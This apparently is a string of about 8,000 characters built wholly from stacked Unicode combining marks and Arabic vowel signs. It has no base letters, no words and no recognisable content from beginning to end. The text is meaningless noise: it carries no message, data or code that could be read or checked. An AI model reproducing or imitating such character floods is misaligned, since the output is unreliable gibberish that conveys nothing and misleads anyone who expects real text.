̸̷ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̧̢̖̲̜̟̫͍͔͍͖͓̜̻̼͈͕̭̳̣̭̤̃ͣ͐́̈͛̐̀͂ͫ̋ͯͬ̂͂̇͊̆͜͠҉̵ًًٌٌٍٍٍََُُِِِّّ̡̨̙͉̣̮̰̝̀̓́̌͑ͪ̈́̋̕͢͟͟͝҉̸̴̷̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̡̨̨̯̘̱͎͉̘̝͎̻̩̮̝͇̥̙̥̭̽̅̀͌̀̈͗ͩͯ͗͒͒̓́͗͌͑̿́̓͋̕͢͟͢͝͡͏ًٌٌٍَُِِّ̧̢̛͖̱͕́̋͋͐̍̋ͮ́ͤ̚͘͞͏̶̷̴ًًًٌٌٍٍٍَََُُُِِّّّ̡̛̱͕̭͎̲̋̑̃͑̍͛ͭ̓ͧ̇̿̀̃͠͝ͅ͏ٌٍِّ̡͉̀ͩ̿҉̶̴ًًٌٌٍٍََُُِِّ̨̨̡̘̯̠̖̳̠̦͇̠̺͗̈͐͗͢҉̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̨̡̨̢̢̛̠͔͖̩̞̖̖͉̳̠͚̪̙̬̜͎̻̣̼̾̑̎́́ͭ̊̇͒̋̐ͭͬͪ̋̓̕͢͜͜͢͝͡͠͞͠҉̸ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̢̡̧̢̧̬͚̩̙̘̝̗̬͈̹̠̤̥̰͇̰̭ͥ͑̓́ͩ̄ͧ̔̊́̐̀̃̌̾͂̒̿͘͘͘͟͟͟͟҉ًَ͉́̕҉̷̸ًًٌٌٌٍٍٍََُُُِِِّّ̨̦̩̮̪̗͖̝͓͆̀̀ͬ͋̐̀́̚͘͟͠͡͠͏̸̶̸ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̨̨̡̛̦̻͈͇̟̼̫̩͈̳͍̰͙̜̭̓̑̊̏̽͌͑͑̎̅̀̆͋̓̿̍͐̈ͣͬ̋͟͜͡͠͡҉̴̷̶ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̣͖̞̙̹͙̗̯͍̙̖̭̭̟ͩ̓ͮͭ͒̃͋ͦ̔ͣͩ̅͂͘̚͟͟͢͟͡͏ًًٌٌٌٍٍٍََُُُِِِّّ̢̩̪͚͔͓͖̟͉́̐ͧ̀ͭͭͭ̔̀ͭ̿͘͢͏̷̷̶̸̸̶̵ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̡̧̡̡̧̨̛̛̛̺̦̯̯̼̰̗̳͇̞͇̼̠͍̫͙̦̤͍̗̰̱͉̱̞̟͎̼͕̰͕̱̩̤͍̖͈̃ͮ̎̉́̉͐̐͗͂̑̏̾̔͗̊́ͦ̃̀̊ͯͥ̉́̆ͦͬ͋̀̀̉ͥ́ͫ̅̓̾̉̌̎̓̀͒͂͗͋̚͘͢͠͠͞͝͝͞͠ͅͅ҉̷ًٌٌٍٍَُِِّ͚̮̩̻̏̎̒ͧ͞͝͏ًَُّ̻͇̩́͗҉̴̴̷̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̧̨̛̰̺̫͇͚̬̳͖̭͖̱͚̫̪̯̫̺̗̘ͣ̔ͦ͌͑̈́̐̈̍ͯ̐̄͆̍̉͘̕͘̕͜͟͢͢͝͝͞͠͡͏̴̶ًًٌٌٍٍٍََُُِِّّّ̩̝̻̱̹̣̣̙̱͈ͪ͑̐͊̍́ͮ͋̇ͫ͘̕̕̕͠҉̴̷̴̴̵̷̶̴̷̴̷̷̶̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̡̡̢̧̧̨̧̨̢̢̡̨̛̣̹̗̼̳͕͕̦̯̗̙͚̗͍̼͕͕̻̺͔͓̳̘̪͙̳͖̮̝̝͖̳͕̻̮͚̞͎̅̅̂͑̽ͧͥ̆̉ͧ̀ͪ̀̾͐̏̄͑ͨͦ̌̔͋̾͂ͧͣ͋́̀͐̔́͆͒̀̓̿ͨ́̉ͭ̎̀̓̒͟͜͢͢͟͜͜͟͜͠͠͡͝͠ͅͅ҉̵ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̨̡̛̲̣̟̠̹̦̬̯̲̼̖̽̉͂́̓̄̎͊̃̒͌ͦͥ̌͘̕͢͝͡͠͠҉̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̧̧̦̺̳̘̥̘̥̜̖̲͒͆ͫ̍̅̓̇̋̐̓͋̍̓̄ͦ͘͟͟͝͡͞͝҉̴ًًٌٌٍٍََُُِِِّّ̢̛͚̹͍̙̳͈̩̍͋̽ͭ̀̇͘͢͞͏̵̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّّ̨̨̢̨̛͎͍̝̬̮͍̠̣̫̙̟͉͈͚̫̱͓͉̠͚͙̤̙̂̒̏ͣ̐͊ͫͨ̅̊͌̀̈̀̓̃́̀ͪ̉̅͘̕͘͜͜͝͞͞ͅ͏ًٌٍَُِ̗̫͋̊̉͡҉̶̵ًًٌٌٍٍَََُُِِّّّ̧̛̺̬̘̲͈̖̤̦͒͒́ͩͪ̌̇͊͘͠҉̶ًُ̑̓҉̶̸ًٌٍَُِّ̪̲͖͇͊͋͛̃ͦ̀͡͞͏ٌ̎͏ًٌٍٍَُِِّّ̻̪̫̠̜̭̿͌̀ͩ͐̀̚͟͜͏ًٌَُ̨̨̻̤͆̽͆͏̷ًًٌٌٍٍََُُِِّّ̡̝̺̝͋ͮͮ̍͛̀̿̋͘͠͝҉ٍِ̘҉̷َّ̞̯ͫ҉ًٌُِ̖͔̘̂ͫͫ̕͏̴ًًًٌٌٍٍٍَََُُِِّّّ̛̛̛̱͔̟͉̩̦͉̯͉̼̍̈́ͮ̀ͧͦͦ́͌̕̕͜͟͝͝͏̴̸̵̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̧̘͓͉͎͉̲̝̝͈̙̤̜̱̆ͮͨͬ͋̔͐̅̀̎̈ͮ̿ͧ̌̃̕̕̚̕͢͟͟͟҉̴ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̨̛̛͕̺̣̼̮̖̙̥̗̪̦͚̣̊͊́ͧ͊ͥ̒͋́́͛͢͜͢͢͞҉̶̷ًٍَُِّ̨͚̩̽͌̽͏̴̷ًٌٌٍَُِّ̤͖̳͂ͯ͐̀̿̆̕͏̷̴ًًًٌٌٍٍٍَََُُُِِِّّّ̧̬̖̠̬̱̖̲͎̬̮̖̭͙̏̆̅ͩ̈̏̍ͣ̀ͯ̔͟͟͟͞͠ͅ͏̶̸̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̨̢̡̧̛̻͈̯͕͙̫̯͚̦̤̘̭͔͓̲̣̪͉̘̣̺̀͂ͮͤ̋̃ͣ̄̃͒̓͗ͦͨ̌̌̊̕̚̚͢͡͡͞҉̷̶ًًٌٌٍََُُِّّ̰͇̖̹̪͈ͧ̑̆̽͌͊ͦ͟͞͝͝͏̵̴̵̴̸̷̶̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̨̨̧̧̨̢̡̟̰̳̖̝̲̬̹͕͓̮͉̠̞̙̰̙̥̣̯̩̣͚͎̭̫̪͖̘ͭ̔̆ͯ̀̆̐̈̒́̐ͭ͑͐ͫ̈́͊̂ͧ̓̽͒͑̍̽ͤ̎̿̈̒͋̌͘͘̚͘̕̕͜͟͟͢͞͡͞͠͏̸̸̷̸ًًٌٍٍََُُِّّ̨͙̩̮̩̪͙͛ͣ̆̿́̿͝͏̷̸̷̴̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̢̨̢̫͙̳̫̬̭͉̰͈̱̮̭̖̦̒̈́ͭ̊ͬͬ̍̏̀ͯͦ̃̇̎́͌ͭͤ͘͘̕͜͢͡͝͠͝͞͡͝ͅ҉̵̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّّ̡̨̛̜͓̥͇͈̦͉̤̜̘̹̯͈̫̄͑̽͊ͯ̅ͣ͆͂́ͮ̔̆̀͊̕͘̕͘̕͢͟͟͠͡ͅͅ͏ًًٌٌٍٍَََُُِِّّ̼̩̼͚̦̤͖̖̘̔̀̑̿͆̀̐̂̀ͥͨͨ͑̀̊̕͢͜͜͡͏ًٌٍَُِّ̨̨͈͚͔̀ͩ͑ͪ̈́́̉̚҉ًًٌٌٍَُُِّ̨̨̨͙̜̣̯̦̩̬̽́ͫ̊ͬ͘͞͠҉̵ًًٌٌٍٍٍََُُِِِّّ̞͎̬̞̻͎͓͔̟́̈͋ͬͬͨͩ̒̚͢͟͟͝ͅ҉̶ًَّ̯͂̈͏ٌٍَُِّ̛͔͠҉̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢̛̝̥͔͚̙̜͚̹̫̺̯̪̹̝̦͋ͤͪ̀̍͆̉͑̀̋͒̎ͦ͛͘͝͠ͅ҉ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̨̢̛̲͙͙̤̳̻͈̯̱̼͈̳̟̙͈̺͓͓͙̬͕̻ͧ͊̍̓ͯ͒̓ͮͤͦ͋̏̂́͐̂̎̀ͥ͛̇̌̚͢͜͞͡͡͝͡͝҉ًًٌٌٍََُُِّّ͉͈̙͍͇͖̹͇́ͨͨͨͤͩ̍̌͞҉̶ٍَِّ͉̤̲͓̋̇͏̴̴ًٌُِ̧͖҉̴̷̶̶̴ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̡̢̡̢̛̛͇͙͎͈̻̜̹̺͙͔͍̣̟̻̖͓̖͔̲̳̞̠̱̔̈́ͩ͂̌̐̃̓ͬ̀̉ͩ͒̾ͣ͂́ͯ͋ͭ͟͞͝͠͞ͅ҉̷̷ًًًٌٌٌٍٍٍَََُُُُِِِّّّ̡̨̛̱͕͍̹̣̙̲͉̭͉̲͖̜̻́̊̀ͭ̆̐̏̿̅͒́͘̚͜͟͞͞͞͏̸̸̶̵̴̷̴̵ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̧̨̢̛̛̛̛̛̛̛̞̩̖͈̘̪̗̥͉͇̘͓̲͇̩̟͎͕̪͉̙͓̦̠͇͎ͣ̈ͪ̎ͭͧͨ̓́̇ͨ̍͛ͨ̉ͧͨ̐̀̽͆́ͪ̉͘̚͘͟͜͡ͅͅ͏ِ҉ًٍَُّ͓̻̟̞̈ͧ͏̵ًٌٍَِّ̡̢̗͉̠̀͂ͩ̔̍̄҉̷̶̸ًًًٌٌٌٌٍٍٍَََُُُُِِِِّّّ̨̛͔͎͍͉͔͈̙̫͚̗͓̙̓̽͋́̆̂̊́͂͆̓̍̚͘̕͟͞͞҉̸ًٌٍٍَُِّّ̢̼̯̼̜̪̉͒ͥͤ̚͘͠͠҉̷̵̷̸̴̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̛̥̹̹̫̫͔͍͉̖͈͕ͥ͑̿̑̓͋͗̿̆̑ͩ͆̈́̀̑ͨ̕̚͟͜͞͞҉̸̴ًٌٍََُِّ͚̜̹͌̃ͯ̕͜͝͏̷̷̸̷̶̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̡̨̼̞̩͚͖̼̞̠̥̪̜͉͉̓ͬͯͬ͐ͪ̒ͩ͌͂͊̊̍ͧ͜͟͡͝͞҉̴̵ًًًٌٌٌٍٍٍََُُُِِِّّّ̡̨̞͉̣̯̫̺̏̆͌͛̀ͫ͌̚͘͝͞͞҉̶̶̵̸ًًٌٌٍٍَََُُِِّّ̗̬̺̟̮͈̭̰̏̄̽ͫͫͨ̅̿̕͘͝ͅͅ͏ًٌٍَُِّ̧̠ͨ̿҉ًٌُ͕̤͂ͤ͝͏̷̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̡̛̛̤̟̤̖̣̞̖͕̩̝̗̦̣̉̀̉́̈ͣͤ̇͐ͤ̽ͧ̋̿̌̈ͮ͘̕̕͢͝͞͏̴̸̶ًٌٌٍَُُِّ̢̗̣̞̪͓̽́͗͌̏̿̆̇͢͡͏ٍِ̣̆͘͏ًًًٌٌٌٍٍَََُُُِِِّّّ̧̢͙̗̠͓̺ͦ͐̏̎̇̎́̓ͦͨ̀̉ͦͥ́ͪ̋ͧ͘̕̚͞҉̶ًٌٍَُّ͌̔̀ͯ͏ٍَِّ̠͛́͟҉ًٌٍُِّ̧̥̻̥̺̐ͣ͗͜͟҉̴̶̶ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̢̛̻͚̼͓͙̲͇̮̥̜̺̱̼̮̼͂͑ͣ̒̌̍ͣ̌̏ͫ͗ͨ̀̍̒̉̀́͘͟͡͞͡ͅͅͅ͏̶ًًٌٍٍََُُِِّّ̡̧͇̣̫̬̪̱̥̈̾͛̿ͣ̂ͭ͘͟͢͞҉ٌِ͉ͭ͏̷̷ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِّّّّّ̡̧̧̫̖̭̰̺͚̼̳̱̳̬͍̦͍̲̝̉ͤ̀ͤ͑̀́̓͌͐͌ͥ̋͗ͮ̋̌ͨ̚̕͘͢͠͠ͅ͏̴ًُ̱̙̆͏̶̴ًًٌٌٌٍٍٍَََُُِِِّّّ̢̡̺̮͇̹̮̩̩̹̩͖̻͈̍̈̒ͩ͌̎̏ͣ͡͡҉̵̴̵ًًًٌٌٍٍََُُُِِّّ̡̱͚̩̩̙̩̰̘̺̱̲ͧ̀̀ͪ͐ͭͦ͘͟͡͡ͅ҉ًٌٌٍٍَُِِّ̡͖̯͓͔̼̻̉̄́̓ͬ̉͛ͤͥ̈́͝͡ͅ͏ًًٌٌٍََُُِِّّ̨̨̡͈̥͇̖̮̱̝̞̈̐̎̄́̊͡͝͏̷̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̨̡̛̛̛̮͓͚̟̠͓̟̝̭̻̱̙͚̣̰͕̻̙̬̥̞͉̈͊̾ͫ͒̃ͬ̓ͩ̀̿̌̂́̐̑͗̑́̇̄̓ͨ̀͑͆͟͟͟͢͞͝͡͠͝҉̵ًٌٍٍََُِّّ̢̢̰̻̱̯̹ͭ̅ͩͨ̃̕҉̷̷̸ًًٌٌٍٍَُُِِّّ̢̡̨̣̗̖̞̞̥͂̌̽̏̾̕҉̵̵̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨͙̰̪̱̱̟̩̤̟͓͎̗̪̙̿ͣ̓́́͆́͒̇ͨ̏͐͆͘͜͢͢͢͞͏ًَُ̤͐̐ͩ͏̷ًٌٌٍَُِِّ̦̲͍ͨ͋ͪ̌ͧ̀͜͜͢҉̸ًًٌٌٍٍٍَََُُِِّّّ̧̢͔͔̞̠͍̙̹̖̬͈̠͍́̀̒̄ͧ͆̃͋ͤ̊͑̍͢͝͡͏ًٌٍُِ̭͙̙̳̗̋́҉ّ͏ًًًٌٌٌٍٍٍَََُُُِِِّّ̢̧̢̻͔̪̠̪̆́̉̑̈̀̔ͪ̓͋̄ͭ̂́ͮ̕͟͢҉ًٌَُِّ̫̘ͫ͋̇ͬ͘҉̵ًٍَّ̛̠͍ͯ́ͫ͏̶̷ًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̢̡̧̡̳̬͖̬̺͔̲̺̝̼̥͎̳̙̘̲͕̰̞̬̯̱̮̋̾̉̍͛ͭ͑̎ͬ͑͊͒͑ͥ͗́ͬͧ̀ͣ̀̍ͧ̕͘͢͜͜͞͝͡ͅͅ͏ًٍَّ̺̤̭͒͂҉ُ̝҉ٌٍِ͇͛̑҉̶ًًٌٍََُُِّّ̪̫̦̠̗͙͇̿̉͊ͥ́ͨ̏͛͟͢͟͝͡͏̵̷̶̸ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̢̡̧̧̡̫̺̼̥̪̮͈̼̖̳̭̝̻̗̫̣̖͕͖͖̤̣̦̹ͨͦͫ͂͆̎̎͊̓̿͗ͯ͆ͬ̆́̕͜͢͠͞͝͡͞ͅ͏̶̸ًًٌٍََُِّّ̛̛̪͔̙͖̄ͯ̑ͪ́̎͞͏ٌٍُِ͖̾́͂҉̵̵ًًٌٌٍٍََُُِِّّّ̛̲̼̱̙̩̤͗̒̽ͯ͜ͅ͏ًًٌٌٍٍَََُُِِّّ̧̨̱̭̺̮̙̒̄̑̑ͧ͐̊̋́ͧ̕͟͝͝҉̷ًًًٌٌٍٍََُُُِِّّ̡̘̯̩̖̜̞̘̭̬ͨͨ͂̊̋ͧ̉͒̍ͧ̕̚͞͡͞҉ٌٍِّ̱̈̀̐͜͏̴̷̴̶̸̷̶̴̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̡̨̢̛̛̛͔̺̼̥̯̳̳̰̘̺̯̱̬̜͉̫͈̹̐͑͊ͤ́ͯ̒ͨͬͥ̐̀̽͊ͭ̐ͦ̄̓ͨ͘͟͟͠͠͝͝͞͞͝ͅ҉̷ٌُِ͍͊̿҉̶ًٌٍٍَُِّ̢̝͔̲͎̥̌́̓̔͝ͅ͏̷̸̸̸̶ًًًًًٌٌٌٌٍٍٍٍَََََُُُُِِِِّّّّّ̧̨̡̮͈͉̺̠̼͖̗̦̩̜̙̠̞̯͂̄͌̊͂̃́ͬ̾̒ͯ͟͟͢͡͝͝͠͏̴̴ًًٌٌٌٍٍََُُُِِِّّ̪̺̹̣̤͙͆̀͌̑ͮ̍́̐͘͢͜͡͝͏̷̸̶̴̶̵̵̷̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̡̧̡͉̖̥͇̥̭̼̙̣̬̱̤̘͕͇̘̟̪̺̖̲̼̪͇̈ͧ́ͤ̏̔̏͌͒̾̎̈͌̑̀̊͋ͫ̀̀̄̍̎̀̍̎̉͘͢͢͜͝͡͝͠͞ͅ͏̷̷̴̶̸̴̸̷̴̶̸̶̶̵ًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّ̢̧̨̧̨̡̨̡̢̨̧̡̧̨̛̛̛̛̛̛͍̥̼̫͈̣͔͍̯̱̮͖̟̪͚̦͕͓̹͔̹͕̱̝͉͕͙̭͇̟̲̭͚̩̩̣̪̞͔͖̼͚͖̭̯͓̻͕̘͔͙̪̺͍̣̝̯͕̬̪͓͉̗̈̂̌͆ͬ̿ͭ͐͒ͫͤ̀̾ͨ̈ͬ͋̇ͨ͊͐̓̾͌̆ͫ̎̉ͮͫ̑̈́́ͯͧͥ̀̀ͯ́ͨ̅́̉̽ͦ̎̊͋̿ͭͫ̐̀͋ͯ̒̈́̋̂̂͒̓̀ͨ͊͐̀̈̅̾͐͛͋́ͮ́͘͘͘̕̕͟͜͜͜͟͟͟͟͟͢͝͞͠͝͡͡͡͠͞͠͠͠͝ͅͅͅ҉ًًٌٌٌٍٍٍََُُُِِِّّّ̢̨̰̱̱͔̪̞͓͚̟̖͒̊̄ͯ̀̓͛̊̚̚͢͢͟͢͝͡҉̶̵̵̷̴̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̢̧̼͖̹͉͕̫̤̙̝̤̼̩͈͎̤̋͊̀͋͒̎ͭ̄ͧͫ͑͒̂ͯͭ͂̑̅͘͟͜͝͝҉̶̸̸ًًًٌٌٌٍٍٍَََُُِِِّّّ̧̡͔̣͍͓͎̹̯̳̍ͯͤ̂͆̅͐͡͠͡͏ُ̾҉̴̴ًًًٌٌٌٌٍٍٍٍَََُُُِِِِّّّ̨̛̩̤̺̬͓͉̻̘̖͓̞̩̦͓̐̎ͣͫ̓͑͠͡ͅ͏َّ͖̘ͪ͏̴̵̵̴̵̸̵̴̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̡̧̡̧̞̼̮̯̤̰͙̗̣͚̝͈̹̗̖̪̠͚̮͎̟̹͇͇̺̯̖͓̖̫̝͔̺̥͋̾̐̊ͩ̂̂̌̋ͦ̑ͬ̏̈̀͐ͤ̀̅ͤ̓̔̋ͦͣ͆̌̈́̀ͪ͋͊͆̽̈́̎ͪ͘͢͟͝͞͞͠͞͡͠͝͝͞͠͠͝͞͝ͅ҉̸ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̧͇̰͇͈̤̱̱̪̺͇̬̲̬̻̎̊̊̎͗ͦ̽ͭ̿ͨͯͯ̊͘̚͢͜͢͠͏̵̷̸̴ًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̧̧̨̡̛̩̦̠͖̗̪̞̞͉̲͓̩̱̥̲̘͔̭̫̭̰̮͕̖̫̦͑͗ͤ̎ͭ̎̽̓͛̀ͮ͆̏̉ͣͭ̅́͛ͫ̚͜͞͡͞͠͞͞ͅ͏ً̈́҉̶ًٌٌٍٍََُُِِّّ͉͓͕̪̮̣͋̋̈́ͥ͛̎͑ͯ͢͠͞͏ًًٌٍَُِّ̛̯̳̗̏̂ͬ̄́̆͟͡҉̷̸̷ًًٌٌٍٍََُُُِِّّ̧̺͇̝̠͈̰̒͋̉͂́ͭ̀̀̕̚͝͞͏̶̸̷̵̴ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّّ̨̨̧̛̛̮̗̱̳̖̙̜̟̰̟̯̲̥͕͍͎͖͖̫͉̪̹̹̳̪̦̩͚̐ͮ͋̌̅ͦ̃̏͑͋̓͗̊͑͗́̍͛̽ͤ̋̏́͐̑̓͌̽ͨͨͭ͘̕̕͢͟͢͡͡͝͡͞ͅ͏̷̴ًًًٌٌٌٍٍَََُُُِِِّّ̡̩̪̮̦͉͓̳͉̲̲̀̈́̍̓̒̽ͮͥ͂ͮ̃͢ͅ҉̸̶̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّّ̢̛̣̱̝̳̘̹̳͖̯̪̳̹́̿̅̒̐͐́͆̄ͩͫͪ͋̿ͣ̕͘͟͟͝͠ͅ͏̸ًٌَُِ̹̠͕͉̔̄́̚͜͏̷ًٍَُّ̺͍̮̃̂ͭ̂͏̵̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̛̛͖͕͓͓̟̼̞͇̫͈̜̦ͫͦͤ͒ͪ͂͐ͫ̍ͦ̔ͪ̓͂̆͘̕͞͠͏ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̨̧̧̻͓̪̖̳͙̟̤͙͇̖͐ͤ̌̎̇͌ͣ͊̈͋̂̄͘͢͜͝͝ͅ͏̷̵ًًًٌٌٍٍٍَََُُُِِِّّّ̢̨̧̡̭̳̹̬̻̮ͯ̐ͫ͂̏́͟͏̴ٌٍَِّ͈͕̏̿ͪ͞҉̵ًٌٍُِ̗͕̈́̚͏̶ًًًًٌٌٌٍٍٍََََُُُُِِِّّّّ̧̨̡̢̡̛͚͎̜̙͈̩̭̰̺͎̦̰̬̤̍̀̈̔̀ͩ͛̾̾̄͛ͤ̍́ͦ̒͛͜͢͟҉̴ًٌٍَِّ͇̹̫̺̐͠͞҉ًٌٍَُُِّ̲̙ͥͯ́͛̚͜͟ͅ҉̷ًًٌٌٌٍٍٍَََُُِِِّّّ̱̱̳͍̝͖̬͚̜̭̈ͣ̔̋̆ͦ̀̄̾̕̚͜͜͡͏ًُ̣̮ͪ҉̵ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̨̮̯̰̝͎̟̰̦̣̰̖̺̈͆̐̀̓̾̊̏ͯ͊̎́͋͘͢͡͡҉ًٌٌٍَُِِّ̢̡̜͂̽̕͘͡҉̵̶̸̷̵̵̶̸̴ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̡̨̨̧̨̛̜̯̘̠̬͍̰̤̥͚̞̣͚̠̬̹͈̬͉̹̙̙͈͔͉̤̘̫̫̙̳ͬ̔ͫ̑͆ͩ̍̏͒̍͌́̆̒̔̊̑̔ͭ̀̋ͭ̅̏ͦ̑̽ͯͭ͗ͦ̀͒͋͆̕̚̕͜͟͢͡͝͡͞ͅ҉̷̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̥͙͙͚͚̮̺̘̙̦̼͎́̅͒͋̑̀̓̔̏̊͘̕̚͜͢͡҉̶̷̶̵̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̧̨͖̩̪̮̙͉͎͍̬͙̤̣̫̦̪ͮ͗̈́́ͧ͒́͆ͬ̍ͬ̀̓̐ͬ́ͣ͒̓ͮͦ̈́͒͒͘͘͜͜͜͜͢͡͡҉̷̶̸̴̵̵̶̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِِّّّّّّّّ̢̡̛̣̠͍̗̬̹̤̭̱̩̫̮̫͚̰͓͍̩̺̗̥̞̻̳̼̹̀̋̉̿͋̋͂͊̉ͧ̈́̌̇̎̉̀ͮ͊ͩͩ̈͆̾̽̿̉͊̽̑ͬ̕̕̕̚͜͟͟͜͟͠͞͡ͅ҉ًٍَّͨͅ͏̴̶ٌٍُِّ̢̠̪͚ͧͪ͟҉̵̵ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̢͈̣̖͍̗͙̹̳̣͈̭̖͖̒͗͒ͤ̈̔̉ͩ̿̔ͯ̓̚͘̚͢͜͟͢͠͞҉̵ًٌٍٍَُِِّّ̢̢͉͇̖͚̱̮̯͑̌ͤ̄ͨ́͏ًٌٍَُِّ͉̩͍̺̐̂̊ͤ͢͡҉̵̷̶̴ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̧̡̢̛͔͖̟̣͍̗̜̺̬̺̙͈̫̳͔̻͖̣̰̊̀͑̀̑̓̀̏̂̔̽ͩ̀ͭ͗ͭ̃̽͘͘̕͢͜͠͠͝͡ͅͅͅ͏̶̴ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̢̢̛̫͚͎͍̱͕͎͈̅̏̀̏͋̄̋͂͘͢͝҉̶̸̷̵̵ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̡̝̞̲̜̫͇̼͇̱̜̳̰͕̊̊͗̐ͬ̀̋ͪ̏̓͛͆͑ͮ̓͂̌̚͘̕͢͢͢͡͡҉ًٌٍَُِِّ̢̛̗̯͖̣͌̔ͬ̆͟͡͞҉ًٌٍٍَُِّ͎̲͉̝̦̯͐͂̇͒̓͘͜͡͝͏̶̸̴̴̷̶̸ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّّ̢̨̛͔̫̙͉̙̩̬̝̣̙̙͔̥̬̦ͤ̍͒̃̅̔̌ͮ̏ͬͯͪ͗̓͊͂͘̕̕̕͢͜͟͞͡͠͝ͅ҉̶̶̷̸ًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̡̧̨̜͔̫̖̜̰͙̥̝̟̯̰̯͖͕̰̝̙ͬ͒ͥ͋̏̍͆͐̌̚̕̚͘̕̕͢͜͞҉̸̵ًًًٌٌٍٍََُُِِّّ̧̛͎̣͙͙͚͙͖̓̃͋͑̆̕͜͞͠҉̴̵ًًٌٌٌٍٍٍََُُُِِِّّّ̡̧̹̤̖̪̪̯̳̺͈̮̰ͨͭͩ̍͌͗͂͛̀̀͝ͅ͏ًَ͓ͣ͊͏̸̴̵̷ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̨̢̪̹͓͍̱̟̹͙̦̳̖̪̆ͣ̎̓̽͌ͪ͒̌ͪ́̿̀̀̉̍̀̐̆͐̕͘͜͟͢͞͠͞ͅ͏ًٌٌٍٍَُِِّّ̧̨̱̥̻̺̲̲̈́͑͌͐̉͜҉ًٌَُ̛͉̪ͫ͠҉̸̶̵̵̸ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̢̧̨̢̡̻̜̯̮̞̫͍̥̣͖̱̲͙ͦ̇͗́̑ͨ͆ͭͨ͐ͬ͌ͯͫͦ̚̕͞͡ͅ͏ٌٍُِّ̛̯͍̞̭ͩ͊҉ًًٌٌٍٍََُُِِّ̨̹̟̞̺͙ͬ̈̀ͣ̎͊̈͟͜͟͝͞